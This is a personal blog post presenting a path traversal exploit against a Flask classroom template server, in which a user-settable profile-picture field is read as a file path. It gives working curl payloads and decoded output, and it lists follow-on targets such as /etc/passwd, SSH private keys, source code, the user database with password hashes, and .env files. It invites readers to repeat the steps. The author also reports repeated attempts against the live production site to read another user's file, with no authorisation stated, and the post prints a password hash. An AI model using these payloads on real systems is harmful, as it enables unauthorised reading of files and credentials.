+++
title = "Smashing Mort's Server for Fun and No Profit 1"
description = "Ported from my original blog post hosted on my Jekyll site"
date = 2025-12-09
+++

Basically, Mr. Mort's template flask server hosts an option for managing user's PFPs. I was able to find a **path traversal vulnerability** in the server which allows me to read any file I want on the host computer (including `/etc/passwd` which I used for this writeup) which effectively gives me full read access to any system this server is hosted on :D. And all you need is a regular user account.

## The Setup

The Flask server has a profile picture feature. Users can upload a profile picture, and it gets stored in their own directory under `instance/uploads/{user_id}/`. The code looks something like this:

```py
# model/pfp.py
def pfp_base64_decode(user_id, user_pfp):
    img_path = os.path.join(app.config["UPLOAD_FOLDER"], user_id, user_pfp)
    try:
        with open(img_path, "rb") as img_file:
            base64_encoded = base64.b64encode(img_file.read()).decode("utf-8")
        return base64_encoded
    except Exception as e:
        print(f"An error occurred while reading the profile picture: {str(e)}")
        return None
```
At first glance, this seems fine. Each user has their own directory, filenames are stored in the database, and only authenticated users can access their pictures. All fine and dandy.

My suspicion at the time was that `os.path.join()` can probably be used to do things it probably shouldn't (like joinging `../`):

```py
>>> import os
>>> os.path.join('/uploads', 'user123', '../../../etc/passwd')
'/uploads/user123/../../../etc/passwd'
```

That path would resolve to `/etc/passwd` and thus I'd be able to access it. Now there's two vulnerable points: `user_id` and `user_pfp`. I decided to go with the latter.


## Tracing the Attack Surface

Looking at the API endpoint that retrieves the profile pictures:

```py
# api/pfp.py
@token_required()
def get(self):
    current_user = g.current_user

    if current_user.pfp:
        base64_encode = pfp_base64_decode(current_user.uid, current_user.pfp)
        if not base64_encode:
            return {'message': 'An error occurred while reading the profile picture.'}, 500
        return {'pfp': base64_encode}, 200
    else:
        return {'message': 'Profile picture is not set.'}, 404
```

It's immediately clear that `curent_user` comes from the database. Question is, can I control what gets stored in the database?

Unforunately, I found out that the upload endpoint uses `secure_filename()`:

```py
# model/pfp.py
try:
    image_data = base64.b64decode(base64_image)
    filename = secure_filename(f"{user_uid}.png")
    user_dir = os.path.join(app.config["UPLOAD_FOLDER"], user_uid)
    if not os.path.exists(user_dir):
        os.makedirs(user_dir)
    file_path = os.path.join(user_dir, filename)
    with open(file_path, "wb") as img_file:
        img_file.write(image_data)
    return filename
```

Alas, the endpoint is secure after all. The filename always used `{user_uid}.png` and it's sanitized with `secure_filename()`. Dead end? Luckily no!


## Finding the Bypass

Then I found the user *update* endpoint.

```py
# api/user.py
# Accounts are desired to be GitHub accounts, change must be validated 
if body.get('uid') and body.get('uid') != user._uid:
    _, status = GitHubUser().get(body.get('uid'))
    if status != 200:
        return {'message': f'User ID {body.get("uid")} not a valid GitHub account' }, 404

# Update the User object to the database using custom update method
user.update(body)

# return response, the updated user details as a JSON object
return jsonify(user.read())
```

This endpoint accepts any field from the request body and passes it to `user.update()`. What about the `pfp` field?

```py
# model/user.py
@pfp.setter
def pfp(self, pfp):
    self._pfp = pfp
```

Yikes. The setter has no validation at all. I can set `pfp` to anything I want through the user update API actually.


## An Exploit

I'll first try performing this proof of concept locally. We'll first start by setting my pfp to a path traversal payload.

Let's say I put a file called `secret.txt` in my own home directory:

```bash
/home/username/secret.txt
```

Now let's set our path traversal payload to that directory:

```bash
curl -X PUT http://localhost:8001/api/user \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"pfp": "../../../../../../../secret.txt"}'
```

We have 7 `../` because that's how deep I store the `flask` repo locally. This is done relative from `flask/instance/uploads/toby/`.

Our response:
```json
{
  "ap_exam": {},
  "class": [],
  "email": "?",
  "grade_data": {},
  "id": 1,
  "kasm_server_needed": true,
  "name": "Thomas Edison",
  "password": "pbkdf2:sha256:1000000$5nmqG27dxK$ef0b2a220d9ada9655c29e88800f6a8c4ebbcade6ad45cb0480a233847601f5c",
  "pfp": "../../../../../../../secret.txt",
  "role": "Admin",
  "school": "Unknown",
  "sections": [
    {
      "abbreviation": "CSA",
      "id": 1,
      "name": "Computer Science A",
      "year": 2026
    },
    {
      "abbreviation": "CSP",
      "id": 2,
      "name": "Computer Science Principles",
      "year": 2026
    }
  ],
  "sid": null,
  "uid": "toby"
}
```

Notice that the `pfp` field is in fact what we set. Now we'll run a simple `GET` request to actually read it:
```bash
curl -X GET http://localhost:8001/api/id/pfp -b cookies.txt
```

And huzza:
```json
{
  "pfp": "cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg=="
}
```

Ok, but that's in base64 because we're using it for image encoding. No problem, just decode it:
```bash
echo "cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg==" | base64 -d
```

And get our `secret.txt` text:
```
please speed I need this

don't read me pls

my server is kind of vulnerable

I've been watching your stream. your key is: BLEHHHHH
```

It works! If you're skeptical, you can try it yourself too, just
1. Authenticate your user and store the cookie
2. `POST` to edit your pfp with some relative path (at `/api/user`)
3. `GET` your pfp (at `/api/id/pfp`)


## Escalating

There's a lot you could do with this. You could grab `/etc/passwd`, `/home/.ssh/id_ed25519` (if correct perms), etc.. I could also access source code:
```bash
curl -X PUT http://localhost:8001/api/user \
  -b cookies.txt \
  -d '{"pfp": "../../../__init__.py"}'
```
and database files (which contain password hashes):
```bash
curl -X PUT http://localhost:8001/api/user \
  -b cookies.txt \
  -d '{"pfp": "../../volumes/user_management.db"}'
```
I could also grab `.env` possibly.


## That's Not in Prod

If you're asking, can I do this right now to Mr. Mort's deployed `flask.opencodingsociety.com`? The answer is no... but I do have some ideas. I've tried quite a few times to get this path traversal working against the actual Amazon EC2 Docker instance, but it wasn't working. For example, let's try grabbing another user's profile picture through this traversal (because if you take a look at the `docker-compose.yml`, `instance` is mounted). Usually, I get this response:
```bash
curl -X PUT https://flask.opencodingsociety.com/api/user \
-H "Content-Type: application/json" \
-b cookies.txt \
-d '{"pfp": "../niko/niko.png"}'
```
```
{"pfp":"../niko/niko.png" ...}
```
```bash
curl -X GET https://flask.opencodingsociety.com/api/id/pfp -b cookies.txt
```
```
{"message": "An error occurred while reading the profile picture."}
```

### The Irony

Funnily enough, the reason why this exploit doesn't work against the deployed server is simply because the profile picture feature has not been implemented (correctly). That's literally it. When you make that web request to set your profile picture, I'm pretty sure you don't get your own directory possibly because the actual server doesn't have write persm to that directory. 

I spun up a Docker instance to investigate this, but so far I'm still investigating. I'll report back in the next blog post. So far, pretty fun exploit to develop, and I have some ideas for fixes + more "exploits" that might work against the actual deployed website!
